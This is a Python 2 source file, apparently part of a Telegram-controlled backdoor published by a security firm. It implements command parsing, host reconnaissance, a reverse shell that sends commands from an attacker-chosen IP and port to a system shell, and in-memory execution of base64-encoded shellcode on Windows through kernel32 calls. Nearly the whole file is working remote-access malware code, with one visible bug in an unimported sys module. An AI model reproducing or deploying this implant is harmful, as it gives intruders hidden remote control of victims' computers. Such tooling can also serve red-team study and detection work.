# The latest version of this code can be found at
# https://www.github.com/blazeinfosec
#
# by Julio Cesar Fort, Wildfire Labs /// Blaze Information Security
#
# Copyright 2016, Blaze Information Security
# https://www.blazeinfosec.com

import base64
import ctypes
import getpass
import os
import platform
import re
import socket
import subprocess
import urllib2

help_message = """
Available commands are:
/command <argument> - executes an arbitrary command
/shellcode <argument> - receives a base64'd shellcode and executes it in memory
/reverseshell <ip> <port> - spawns a connect-back shell to a specified IP and port
/sysinfo - returns system information (e.g., 'uname -a', public IP address, etc.)
/whoami - returns the current logged in user
/download - downloads a remote file from the server
/upload - NOT IMPLEMENTED. Use Telegram's functionality for this purpose.
/kill - Kills the backdoor.
/help - This help message.
"""

notimplemented_message = "This command has not been implemented yet."
uploadfunctionality_message = "Use Telegram's built-in functionality for this purpose."
suicide_message = "Killing the backdoor..."


def parse_command(cmd):
    if cmd.startswith('/'):
        if "command " in cmd:
            command_to_execute = cmd[len('/command '):]
            return ("command", command_to_execute)

        if "shellcode " in cmd:
            shellcode = cmd[len('/shellcode '):]
            return ("shellcode", shellcode)

        elif "sysinfo" in cmd:
            return ("sysinfo", "Null")

        elif "whoami" in cmd:
            return ("whoami", "Null")

        elif "upload" in cmd:
            return ("upload", "Null")

        elif "download" in cmd:
            filename = cmd[len('/download '):]
            return ("download", filename)

        elif "reverseshell" in cmd:
            ip_port = cmd[len('/reverseshell '):]
            return ("reverseshell", ip_port)

        elif "kill" in cmd:
            return ("kill", "Null")

        elif "help" in cmd:
            return("help", "Null")
        else:
            return ("unknown", cmd)

    else:
        return ("help", cmd)


def whoami():
    return getpass.getuser()


def get_system_info():
    # TODO: Return IP addresses of all available interfaces
    uname = ""
    for s in platform.uname():
        uname += s + " "

    ip = "[+] Public IP: " + get_public_ip()
    current_user = "[+] Current user: " + whoami()
    current_path = "[+] Current path: " + os.getcwd()

    system_info = uname + "\n" + ip + "\n" + current_user + "\n" + current_path

    return system_info


def get_public_ip():
    '''
    Generic get public IP function using DynDNS from http://bit.ly/1QvILBT
    Using urllib2 just to make sure it works in most Python installs
    '''
    ip = ""
    try:
        response = urllib2.urlopen('http://checkip.dyndns.com/')
        ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(response.read()).group(1)
    except Exception:
        pass

    return ip


def get_internal_ip():
    ''' NOT IMPLEMENTED YET '''
    return


def windows_getip():
    ''' NOT IMPLEMENTED YET '''
    return


def linux_getip():
    ''' NOT IMPLEMENTED YET '''
    return


def reverse_shell(ip, port):
    child_pid = os.fork()

    if child_pid:
        print ip, port
        try:
            sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sockfd.connect((ip, int(port)))
            while True:
                data = sockfd.recv(1024)
                if data == "exit\n":
                    sockfd.send("[!] Exiting the reverse shell.\n")
                    break

                comm = subprocess.Popen(data, shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                sockfd.send(STDOUT)
                sockfd.send(STDERR)
        except Exception:
            pass

        sockfd.close()
        sys.exit(0)
        return  # NEVER REACHED
    else:
        return


def execute_shellcode(msg):
    if "Windows" not in platform.system():
        return "[!] Currently this functionality is only available for Windows platforms."
    else:
        # based on Debasish Mandal's "Execute ShellCode Using Python"
        # http://www.debasish.in/2012/04/execute-shellcode-using-python.html
        shellcode = bytearray(base64.b64decode(msg))

        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                  ctypes.c_int(len(shellcode)),
                                                  ctypes.c_int(0x3000),
                                                  ctypes.c_int(0x40))

        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                             buf,
                                             ctypes.c_int(len(shellcode)))

        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(ptr),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))

        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
                                                   ctypes.c_int(-1))

        return "[*] Shellcode (%d bytes) executed in memory." % len(shellcode)
